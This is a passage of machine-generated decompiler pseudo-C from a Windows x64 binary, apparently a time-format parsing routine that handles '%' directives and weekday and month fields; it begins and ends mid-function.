+ -8) = 0x140044c30;\n            fcn.1400bd360(0x14010b302);\n            unaff_R14 = ppiVar86;\n        }\n        else {\n            puVar63 = unaff_R12 + 1;\n            *(ppuVar77 + 0x50) = *(arg1 + 0x22);\n            iVar58 = *(ppuVar77 + 0xa0);\n            if (iVar58 == *(ppuVar77 + 0x68)) {\n                puVar70 = 0x7;\n            }\n            else {\n                puVar70 = *(ppuVar77 + 0xb0);\n            }\n            if (puVar70 < puVar63) {\n                *(ppuVar77 + 0x20) = 1;\n                *(ppuVar77 + -8) = 0x140044ba4;\n                fcn.1400aced0(*(ppuVar77 + 0x38), unaff_R12, 0, 0);\n                iVar58 = *(ppuVar77 + 0xa0);\n            }\n            ppiVar59 = NULL;\n            *(iVar58 + unaff_R12 * 2) = *(ppuVar77 + 0x50);\n            *(ppuVar77 + 0xa8) = puVar63;\n            *(iVar58 + 2 + unaff_R12 * 2) = 0;\n            if (uVar49 < 0) {\n                ppiVar86 = NULL;\n                ppiVar59 = -uVar49;\n                *(ppuVar77 + 0x20) = *(arg1 + 0x66);\n                *(ppuVar77 + -8) = 0x140044b2d;\n                fcn.1400ab0f0(*(ppuVar77 + 0x38), puVar63, 0, ppiVar59);\n                if (unaff_R14 <= 0x1fffffffffffffff - *(ppuVar77 + 0xa8)) goto code_r0x0001400449c9;\ncode_r0x000140044c18:\n                *(ppuVar77 + -8) = 0x140044c24;\n                fcn.1400bd360(0x14010b302);\n                goto code_r0x000140044c24;\n            }\n            unaff_R14 = *(arg1 + 0xb);\n            unaff_RDI = unaff_RDI + uVar49 * 2;\n            if (unaff_R14 <= 0x1fffffffffffffff - puVar63) {\ncode_r0x0001400449c9:\n                *(ppuVar77 + -8) = 0x1400449d3;\n                fcn.1400acd00(*(ppuVar77 + 0x38), unaff_RDI, unaff_R14);\n                unaff_R12 = *(ppuVar77 + 0xa8);\n                goto code_r0x000140044646;\n            }\n        }\n        *(ppuVar77 + -8) = 0x140044c3c;\n        fcn.1400bd360(0x14010b302);\n        unaff_R12 = unaff_R14;\ncode_r0x000140044c3c:\n        *(ppuVar77 + -8) = 0x140044c4f;\n        uVar56 = fcn.1400b7b60(0x14010b358, 0x14010b344, unaff_R12, ppiVar59);\n        *(ppuVar77 + -8) = 0x140044c57;\n        fcn.1400bc860(uVar56);\n        pcVar2 = (*arg1)[1];\n        *(ppuVar77 + -8) = 0x140044c60;\n        (*pcVar2)(arg1);\n        do {\n            *(ppuVar77 + -8) = 0x140044c65;\n            uVar56 = fcn.1400bcd60();\n            *(ppuVar77 + -8) = 0x140044c6d;\n            fcn.1400bc860(uVar56);\n        } while( true );\n    case 0x5b:\n        return UNRECOVERED_JUMPTABLE._0_8_;\n    case 0x5c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x60:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x61:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x62:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 99:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 100:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x65:\ncode_r0x00014003a762:\n        *(ppuVar75 + 0x20) = UNRECOVERED_JUMPTABLE._0_8_;\n        *(ppuVar75 + 0xe0) = in_XMM6_Da;\n        *(ppuVar75 + 0xe4) = in_XMM6_Db;\n        *(ppuVar75 + 0xe8) = in_XMM6_Dc;\n        *(ppuVar75 + 0xec) = in_XMM6_Dd;\n        *(ppuVar75 + 0xf0) = in_XMM5_Da;\n        *(ppuVar75 + 0xf4) = in_XMM5_Db;\n        *(ppuVar75 + 0xf8) = in_XMM5_Dc;\n        *(ppuVar75 + 0xfc) = in_XMM5_Dd;\n        *(ppuVar75 + 0x100) = in_XMM4_Da;\n        *(ppuVar75 + 0x104) = in_XMM4_Db;\n        *(ppuVar75 + 0x108) = in_XMM4_Dc;\n        *(ppuVar75 + 0x10c) = in_XMM4_Dd;\n        *(ppuVar75 + 0x110) = in_XMM3_Da;\n        *(ppuVar75 + 0x114) = in_XMM3_Db;\n        *(ppuVar75 + 0x118) = in_XMM3_Dc;\n        *(ppuVar75 + 0x11c) = in_XMM3_Dd;\n        *(ppuVar75 + 0x120) = piVar88;\n        *(ppuVar75 + 0x128) = piVar81;\n        *(ppuVar75 + 0x140) = auVar90;\n        *(ppuVar75 + 0xa0) = in_XMM1_Da;\n        *(ppuVar75 + 0xa4) = in_XMM1_Db;\n        *(ppuVar75 + 0xa8) = in_XMM1_Dc;\n        *(ppuVar75 + 0xac) = in_XMM1_Dd;\n        *(ppuVar75 + -8) = 0x14003a7a4;\n        fcn.140038e30(puVar63, arg3, in_stack_00000030, ppiVar59, *(ppuVar75 + 0x20), *(ppuVar75 + 0x28), \n                      *(ppuVar75 + 0x30), *(ppuVar75 + 0x38), *(ppuVar75 + 0x40), *(ppuVar75 + 0x48), *(ppuVar75 + 0x50)\n                      , *(ppuVar75 + 0x58), *(ppuVar75 + 0x60), *(ppuVar75 + 0x68), *(ppuVar75 + 0x70), \n                      *(ppuVar75 + 0x78), *(ppuVar75 + 0x80));\n        ppiVar59 = *(ppuVar75 + 0xb0);\n        ppuVar76 = ppuVar75;\ncode_r0x00014003a7ac:\n        unaff_RSI = *(ppuVar76 + 0xb8);\n        *(ppuVar76 + 0xc0) = ppiVar59;\n        *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n        *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n        if (*(ppuVar76 + 0xd8) == 0) {\n            *(*(ppuVar76 + 0x280) + 0x18) = *(ppuVar76 + 0xdc) % 7;\n            **(ppuVar76 + 0x290) = **(ppuVar76 + 0x290) | 2;\n        }\ncode_r0x000140039f81:\n        *(ppuVar76 + 0x58) = *(ppuVar76 + 0x58) + 1;\n        iVar45 = unaff_RSI;\n        bVar89 = iVar45 == -1;\n        uVar40 = arg1;\n        if ((ppiVar59 == NULL) || (!bVar89)) {\n            bVar79 = unaff_RDI != NULL & uVar40;\n            bVar82 = bVar89;\n            if (bVar79 != false) goto code_r0x000140039fd8;\ncode_r0x000140039e73:\n            if (bVar82 != uVar40) goto code_r0x000140039e7e;\ncode_r0x00014003a010:\n            ppiVar59 = *(ppuVar76 + 0x250);\n            puVar87 = *(ppuVar76 + 0x278);\n            if ((*(ppuVar76 + 0x58) == *(ppuVar76 + 0x68)) && (*(ppuVar76 + 100) == 0)) goto code_r0x00014003a03b;\ncode_r0x00014003a037:\n            *puVar87 = *puVar87 | 4;\ncode_r0x00014003a03b:\n            uVar1 = *(ppuVar76 + 0xc4);\n            uVar5 = *(ppuVar76 + 200);\n            uVar6 = *(ppuVar76 + 0xcc);\n            *ppiVar59 = *(ppuVar76 + 0xc0);\n            *(ppiVar59 + 4) = uVar1;\n            *(ppiVar59 + 1) = uVar5;\n            *(ppiVar59 + 0xc) = uVar6;\n            return ppiVar59;\n        }\n        if (ppiVar59[2] < ppiVar59[3]) {\n            iVar46 = *ppiVar59[2];\n        }\n        else {\n            pcVar2 = (*ppiVar59)[9];\n            *(ppuVar76 + -8) = 0x14003a3ba;\n            iVar46 = (*pcVar2)(ppiVar59);\n        }\n        if (iVar46 == -1) {\n            *(ppuVar76 + 0xc0) = 0;\n        }\n        bVar79 = unaff_RDI != NULL & uVar40;\n        bVar82 = iVar46 == -1;\n        if (bVar79 == false) goto code_r0x000140039e73;\ncode_r0x000140039fd8:\n        if (unaff_RDI[2] < unaff_RDI[3]) {\n            iVar46 = *unaff_RDI[2];\n        }\n        else {\n            pcVar2 = (*unaff_RDI)[9];\n            *(ppuVar76 + -8) = 0x14003a3a1;\n            iVar46 = (*pcVar2)(unaff_RDI);\n        }\n        if (iVar46 == -1) {\n            unaff_RDI = NULL;\n        }\n        else {\n            bVar79 = false;\n        }\n        if (bVar82 == bVar79) goto code_r0x00014003a010;\ncode_r0x000140039e7e:\n        if (*(ppuVar76 + 0x68) <= *(ppuVar76 + 0x58)) goto code_r0x00014003a010;\n        if (*(ppuVar76 + 100) != 0) {\n            ppiVar59 = *(ppuVar76 + 0x250);\n            puVar87 = *(ppuVar76 + 0x278);\n            goto code_r0x00014003a037;\n        }\n        pcVar2 = (*unaff_R12)[0xc];\n        *(ppuVar76 + -8) = 0x140039ebf;\n        cVar39 = (*pcVar2)();\n        if (cVar39 != '%') {\n            pcVar2 = (*unaff_R12)[2];\n            *(ppuVar76 + -8) = 0x140039eda;\n            cVar39 = (*pcVar2)();\n            ppiVar59 = *(ppuVar76 + 0xc0);\n            if (cVar39 == '\\0') {\n                cVar39 = ppiVar59 != NULL;\n                pcVar2 = (*unaff_R12)[8];\n                *(ppuVar76 + -8) = 0x140039eff;\n                uVar43 = (*pcVar2)();\n                *(ppuVar76 + 0x70) = uVar43;\n                bVar79 = bVar89 && cVar39;\n                if (bVar79) {\n                    if (ppiVar59[2] < ppiVar59[3]) {\n                        iVar45 = *ppiVar59[2];\n                        cVar39 = bVar79;\n                    }\n                    else {\n                        piVar88 = *ppiVar59;\n                        *(ppuVar76 + 0x88) = bVar79;\n                        pcVar2 = piVar88[9];\n                        *(ppuVar76 + -8) = 0x14003ba19;\n                        iVar45 = (*pcVar2)(ppiVar59);\n                        cVar39 = *(ppuVar76 + 0x88);\n                    }\n                    if (iVar45 == -1) {\n                        *(ppuVar76 + 0xc0) = 0;\n                        cVar39 = '\\0';\n                        ppiVar59 = NULL;\n                    }\n                }\n                pcVar2 = (*unaff_R12)[8];\n                *(ppuVar76 + -8) = 0x140039f1d;\n                iVar45 = (*pcVar2)();\n                if (*(ppuVar76 + 0x70) != iVar45) {\n                    pcVar2 = (*unaff_R12)[6];\n                    *(ppuVar76 + -8) = 0x140039f36;\n                    iVar45 = (*pcVar2)();\n                    if ((bVar89) && (cVar39 != '\\0')) {\n                        if (ppiVar59[2] < ppiVar59[3]) {\n                            iVar46 = *ppiVar59[2];\n                        }\n                        else {\n                            pcVar2 = (*ppiVar59)[9];\n                            *(ppuVar76 + -8) = 0x14003a8ee;\n                            iVar46 = (*pcVar2)(ppiVar59);\n                        }\n                        if (iVar46 == -1) {\n                            *(ppuVar76 + 0xc0) = 0;\n                        }\n                    }\n                    pcVar2 = (*unaff_R12)[6];\n                    *(ppuVar76 + -8) = 0x140039f54;\n                    iVar46 = (*pcVar2)();\n                    ppiVar59 = *(ppuVar76 + 0xc0);\n                    if (iVar45 != iVar46) goto code_r0x000140039f66;\n                }\n                goto code_r0x00014003a100;\n            }\n            unaff_R14 = NULL;\n            while( true ) {\n                uVar41 = unaff_RSI == -1;\n                uVar40 = ppiVar59 != NULL && uVar41;\n                if (ppiVar59 != NULL && uVar41) {\n                    if (ppiVar59[2] < ppiVar59[3]) {\n                        iVar45 = *ppiVar59[2];\n                    }\n                    else {\n                        piVar88 = *ppiVar59;\n                        *(ppuVar76 + 0x70) = uVar40;\n                        pcVar2 = piVar88[9];\n                        *(ppuVar76 + -8) = 0x14003a35e;\n                        iVar45 = (*pcVar2)(ppiVar59);\n                        uVar40 = *(ppuVar76 + 0x70);\n                    }\n                    uVar41 = 0;\n                    if (iVar45 == -1) {\n                        ppiVar59 = NULL;\n                        *(ppuVar76 + 0xc0) = 0;\n                        uVar41 = uVar40;\n                        uVar40 = 0;\n                    }\n                }\n                uVar42 = unaff_RDI != NULL & arg1;\n                uVar64 = arg1;\n                if (uVar42 != 0) {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar45 = *unaff_RDI[2];\n                    }\n                    else {\n                        piVar88 = *unaff_RDI;\n                        *(ppuVar76 + 0x70) = uVar40;\n                        pcVar2 = piVar88[9];\n                        *(ppuVar76 + -8) = 0x14003a345;\n                        iVar45 = (*pcVar2)(unaff_RDI);\n                        uVar40 = *(ppuVar76 + 0x70);\n                    }\n                    if (iVar45 == -1) {\n                        unaff_RDI = NULL;\n                        uVar64 = uVar42;\n                    }\n                    else {\n                        uVar64 = unaff_R14;\n                    }\n                }\n                if (uVar41 == uVar64) break;\n                if (uVar40 != 0) {\n                    ppuVar74 = ppuVar76;\n                    if (ppiVar59[2] < ppiVar59[3]) {\n                        in_stack_00000030 = *ppiVar59[2];\n                    }\n                    else {\n                        pcVar2 = (*ppiVar59)[9];\n                        *(ppuVar76 + -8) = 0x14003a38a;\n                        uVar44 = (*pcVar2)(ppiVar59);\n                        in_stack_00000030 = uVar44;\n                    }\ncode_r0x00014003a242:\n                    ppuVar76 = ppuVar74;\n                    if (in_stack_00000030 == -1) {\n                        *(ppuVar74 + 0xc0) = 0;\n                        ppiVar59 = NULL;\n                    }\n                }\n                pcVar2 = (*unaff_R12)[2];\n                *(ppuVar76 + -8) = 0x14003a16e;\n                cVar39 = (*pcVar2)();\n                if (cVar39 == '\\0') break;\n                if (ppiVar59[2] < ppiVar59[3]) {\n                    ppiVar59[2] = ppiVar59[2] + 2;\n                }\n                else {\n                    pcVar2 = (*ppiVar59)[10];\n                    *(ppuVar76 + -8) = 0x14003a29a;\n                    (*pcVar2)(ppiVar59);\n                }\n                unaff_RSI = 0xffffffff;\n                *(ppuVar76 + 200) = 0xffff;\n            }\n            goto code_r0x000140039f81;\n        }\n        pcVar2 = (*unaff_R12)[0xc];\n        *(ppuVar76 + -8) = 0x14003a0b2;\n        cVar39 = (*pcVar2)();\n        *(ppuVar76 + 0xdc) = 0;\n        if ((cVar39 == 'E') || (cVar39 == 'O')) {\n            *(ppuVar76 + 0x58) = *(ppuVar76 + 0x58) + 2;\n            pcVar2 = (*unaff_R12)[0xc];\n            *(ppuVar76 + -8) = 0x14003a288;\n            cVar39 = (*pcVar2)();\n        }\n        else {\n            *(ppuVar76 + 0x58) = *(ppuVar76 + 0x58) + 1;\n        }\n        uVar49 = unaff_RDI != NULL & arg1;\n        uVar41 = uVar49;\n        unaff_RBP = uVar49;\n        switch(cVar39 + -0x25) {\n        case '\\0':\n            ppiVar59 = *(ppuVar76 + 0xc0);\n            if ((ppiVar59 != NULL) && (bVar89)) {\n                if (ppiVar59[2] < ppiVar59[3]) {\n                    iVar45 = *ppiVar59[2];\n                }\n                else {\n                    pcVar2 = (*ppiVar59)[9];\n                    *(ppuVar76 + -8) = 0x14003be0a;\n                    iVar45 = (*pcVar2)(ppiVar59);\n                }\n                if (iVar45 == -1) {\n                    *(ppuVar76 + 0xc0) = 0;\n                    ppiVar59 = NULL;\n                }\n            }\n            pcVar2 = (*unaff_R12)[10];\n            *(ppuVar76 + -8) = 0x14003a91d;\n            iVar46 = (*pcVar2)();\n            if (iVar46 == iVar45) {\ncode_r0x00014003a100:\n                if (ppiVar59[2] < ppiVar59[3]) {\n                    ppiVar59[2] = ppiVar59[2] + 2;\n                }\n                else {\n                    pcVar2 = (*ppiVar59)[10];\n                    *(ppuVar76 + -8) = 0x14003a37a;\n                    (*pcVar2)(ppiVar59);\n                }\n                unaff_RSI = 0xffffffff;\n                *(ppuVar76 + 200) = 0xffff;\n            }\n            else {\n                *(ppuVar76 + 0xd8) = 4;\n                *(ppuVar76 + 100) = 4;\n            }\n            goto code_r0x000140039f81;\n        default:\n            goto code_r0x000140039f66;\n        case '\\x1c':\n        case '<':\n            goto code_r0x00014003a6a9;\n        case '\\x1d':\n        case '=':\n        case 'C':\n            ppiVar59 = ppuVar76 + 0x90;\n            puVar63 = ppuVar76 + 0xb0;\n            in_stack_00000030 = ppuVar76 + 0xa0;\n            UNRECOVERED_JUMPTABLE._0_8_ = *(*(ppuVar76 + 0x80) + 0x10);\n            piVar88 = UNRECOVERED_JUMPTABLE._0_8_[0x2b];\n            piVar81 = UNRECOVERED_JUMPTABLE._0_8_[0x2c];\n            in_XMM5_Da = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x25);\n            in_XMM5_Db = *(UNRECOVERED_JUMPTABLE._0_8_ + 300);\n            in_XMM5_Dc = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x26);\n            in_XMM5_Dd = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x134);\n            in_XMM4_Da = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x27);\n            in_XMM4_Db = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x13c);\n            in_XMM4_Dc = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x28);\n            in_XMM4_Dd = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x144);\n            in_XMM3_Da = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x29);\n            in_XMM3_Db = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x14c);\n            in_XMM3_Dc = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x2a);\n            in_XMM3_Dd = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x154);\n            in_XMM1_Da = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x2d);\n            in_XMM1_Db = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x16c);\n            in_XMM1_Dc = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x2e);\n            in_XMM1_Dd = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x174);\ncode_r0x00014003a40b:\n            uVar1 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x2f);\n            uVar5 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x17c);\n            uVar6 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x30);\n            uVar7 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x184);\n            uVar8 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x21);\n            uVar9 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x10c);\n            uVar10 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x22);\n            uVar11 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x114);\n            uVar12 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x23);\n            uVar13 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x11c);\n            uVar14 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x24);\n            uVar15 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x124);\n            uVar16 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1b);\n            uVar17 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xdc);\n            uVar18 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1c);\n            uVar19 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xe4);\n            uVar20 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1d);\n            uVar21 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xec);\n            uVar22 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1e);\n            uVar23 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xf4);\n            uVar24 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1f);\n            uVar25 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xfc);\n            uVar26 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x20);\n            uVar27 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x104);\n            uVar28 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x19);\n            uVar29 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xcc);\n            uVar30 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1a);\n            uVar31 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xd4);\n            *(ppuVar76 + 0x170) = piVar88;\n            *(ppuVar76 + 0x178) = piVar81;\n            *(ppuVar76 + 0x140) = in_XMM5_Da;\n            *(ppuVar76 + 0x144) = in_XMM5_Db;\n            *(ppuVar76 + 0x148) = in_XMM5_Dc;\n            *(ppuVar76 + 0x14c) = in_XMM5_Dd;\n            *(ppuVar76 + 0x150) = in_XMM4_Da;\n            *(ppuVar76 + 0x154) = in_XMM4_Db;\n            *(ppuVar76 + 0x158) = in_XMM4_Dc;\n            *(ppuVar76 + 0x15c) = in_XMM4_Dd;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            *(ppuVar76 + 0x160) = in_XMM3_Da;\n            *(ppuVar76 + 0x164) = in_XMM3_Db;\n            *(ppuVar76 + 0x168) = in_XMM3_Dc;\n            *(ppuVar76 + 0x16c) = in_XMM3_Dd;\n            *(ppuVar76 + 0x180) = in_XMM1_Da;\n            *(ppuVar76 + 0x184) = in_XMM1_Db;\n            *(ppuVar76 + 0x188) = in_XMM1_Dc;\n            *(ppuVar76 + 0x18c) = in_XMM1_Dd;\n            *(ppuVar76 + 400) = uVar1;\n            *(ppuVar76 + 0x194) = uVar5;\n            *(ppuVar76 + 0x198) = uVar6;\n            *(ppuVar76 + 0x19c) = uVar7;\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0x40) = ppuVar76 + 0xd8;\n            *(ppuVar76 + 0xe0) = uVar28;\n            *(ppuVar76 + 0xe4) = uVar29;\n            *(ppuVar76 + 0xe8) = uVar30;\n            *(ppuVar76 + 0xec) = uVar31;\n            *(ppuVar76 + 0xf0) = uVar16;\n            *(ppuVar76 + 0xf4) = uVar17;\n            *(ppuVar76 + 0xf8) = uVar18;\n            *(ppuVar76 + 0xfc) = uVar19;\n            *(ppuVar76 + 0x100) = uVar20;\n            *(ppuVar76 + 0x104) = uVar21;\n            *(ppuVar76 + 0x108) = uVar22;\n            *(ppuVar76 + 0x10c) = uVar23;\n            *(ppuVar76 + 0x110) = uVar24;\n            *(ppuVar76 + 0x114) = uVar25;\n            *(ppuVar76 + 0x118) = uVar26;\n            *(ppuVar76 + 0x11c) = uVar27;\n            *(ppuVar76 + 0x120) = uVar8;\n            *(ppuVar76 + 0x124) = uVar9;\n            *(ppuVar76 + 0x128) = uVar10;\n            *(ppuVar76 + 300) = uVar11;\n            *(ppuVar76 + 0x130) = uVar12;\n            *(ppuVar76 + 0x134) = uVar13;\n            *(ppuVar76 + 0x138) = uVar14;\n            *(ppuVar76 + 0x13c) = uVar15;\n            *(ppuVar76 + 0x30) = 0x18;\n            *(ppuVar76 + 0x38) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x28) = ppuVar76 + 0xe0;\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + -8) = 0x14003a51b;\n            fcn.140038e30(puVar63, *(ppuVar76 + 600), in_stack_00000030, ppiVar59, *(ppuVar76 + 0x20), \n                          *(ppuVar76 + 0x28), *(ppuVar76 + 0x30), *(ppuVar76 + 0x38), *(ppuVar76 + 0x40), \n                          *(ppuVar76 + 0x48), *(ppuVar76 + 0x50), *(ppuVar76 + 0x58), *(ppuVar76 + 0x60), \n                          *(ppuVar76 + 0x68), *(ppuVar76 + 0x70), *(ppuVar76 + 0x78), *(ppuVar76 + 0x80));\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                *(*(ppuVar76 + 0x280) + 0x10) = *(ppuVar76 + 0xdc) % 0xc;\n                **(ppuVar76 + 0x290) = **(ppuVar76 + 0x290) | 0x408;\n            }\n            goto code_r0x000140039f81;\n        case '\\x1e':\n            *(ppuVar76 + 0x30) = 99;\n            *(ppuVar76 + 0x28) = 0;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            *(ppuVar76 + 0x48) = ppuVar76 + 0xd8;\n            *(ppuVar76 + 0x38) = 2;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + -8) = 0x14003b4c7;\n            fcn.140038900(ppuVar76 + 0xb0, *(ppuVar76 + 600), ppuVar76 + 0xa0, ppuVar76 + 0x90);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                puVar52 = *(ppuVar76 + 0x290);\n                uVar1 = *(ppuVar76 + 0xdc);\n                *puVar52 = *puVar52 | 0x480;\n                *(puVar52 + 2) = uVar1;\n            }\n            goto code_r0x000140039f81;\n        case '\\x1f':\n            pcVar2 = (*unaff_R12)[0xb];\n            *(ppuVar76 + -8) = 0x14003b1a8;\n            (*pcVar2)();\n            *(ppuVar76 + 0x38) = ppuVar76 + 0xe0;\n            puVar63 = ppuVar76 + 0xb0;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            uVar55 = *(ppuVar76 + 0x290);\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\ncode_r0x00014003b1e3:\n            *(ppuVar76 + 0x40) = uVar55;\n            goto code_r0x00014003b1e8;\n        case '#':\n            UNRECOVERED_JUMPTABLE._0_8_ = *(ppuVar76 + 0x78);\n            *(ppuVar76 + 0x30) = 0x17;\n            ppiVar59 = ppuVar76 + 0x90;\n            puVar63 = ppuVar76 + 0xb0;\n            *(ppuVar76 + 0x28) = 0;\n            arg3 = *(ppuVar76 + 600);\n            in_stack_00000030 = ppuVar76 + 0xa0;\n            ppuVar36 = ppuVar76;\ncode_r0x00014003b2a8:\n            ppuVar76 = ppuVar36;\n            *(ppuVar76 + 0x98) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppuVar76 + 0x48) = ppuVar76 + 0xd8;\n            *(ppuVar76 + 0x38) = 2;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + -8) = 0x14003b2fe;\n            fcn.140038900(puVar63, arg3, in_stack_00000030, ppiVar59);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                *(*(ppuVar76 + 0x280) + 8) = *(ppuVar76 + 0xdc);\n                **(ppuVar76 + 0x290) = **(ppuVar76 + 0x290) & 0xfe;\n            }\n            goto code_r0x000140039f81;\n        case '$':\n            UNRECOVERED_JUMPTABLE._0_8_ = *(ppuVar76 + 0x78);\n            *(ppuVar76 + 0x30) = 0xc;\ncode_r0x00014003ae03:\n            ppiVar59 = ppuVar76 + 0x90;\n            puVar63 = ppuVar76 + 0xb0;\n            *(ppuVar76 + 0x28) = 1;\n            arg3 = *(ppuVar76 + 600);\n            in_stack_00000030 = ppuVar76 + 0xa0;\n            ppuVar38 = ppuVar76;\ncode_r0x00014003ae2b:\n            ppuVar76 = ppuVar38;\n            *(ppuVar76 + 0x98) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppuVar76 + 0x48) = ppuVar76 + 0xd8;\n            *(ppuVar76 + 0x38) = 2;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + -8) = 0x14003ae81;\n            fcn.140038900(puVar63, arg3, in_stack_00000030, ppiVar59);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                *(*(ppuVar76 + 0x280) + 8) = *(ppuVar76 + 0xdc) % 0xc;\n                **(ppuVar76 + 0x290) = 